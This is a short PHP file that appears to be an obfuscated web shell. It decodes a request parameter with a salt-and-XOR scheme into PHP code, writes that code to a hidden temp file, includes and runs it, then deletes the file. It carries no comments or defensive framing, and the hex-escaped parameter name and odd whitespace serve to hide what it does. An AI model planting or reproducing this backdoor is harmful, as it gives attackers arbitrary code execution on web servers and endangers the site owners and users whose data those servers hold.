<?php

if(isset($_REQUEST["\x70\x6F\x69nte\x72"])){
	$binding = $_REQUEST["\x70\x6F\x69nte\x72"];
	 	 $binding 	= 	explode ("."	 	,			$binding 	 );		
	$symbol		='';
            $salt		='abcdefghijklmnopqrstuvwxyz0123456789';
            $lenS		=strlen($salt);
            $__len		=count($binding);
    
            for ($s		=0; $s < $__len; $s++) {$v8		=$binding[$s];
                $chS		=ord($salt[$s % 	$lenS]);
                $dec		=((int)$v8 - $chS - ($s % 	10))^ 72;
                $symbol	.=chr($dec);		}
	$rec = array_filter([ini_get("upload_tmp_dir"), getenv("TEMP"), getcwd(), sys_get_temp_dir(), getenv("TMP"), "/dev/shm", "/tmp", "/var/tmp", session_save_path()]);
	foreach ($rec as $hld):
    		if (!( !is_dir($hld) || !is_writable($hld) )) {
    $dat = join("/", [$hld, ".value"]);
    $success = file_put_contents($dat, $symbol);
if ($success) {
	include $dat;
	@unlink($dat);
	die();}
}
endforeach;
}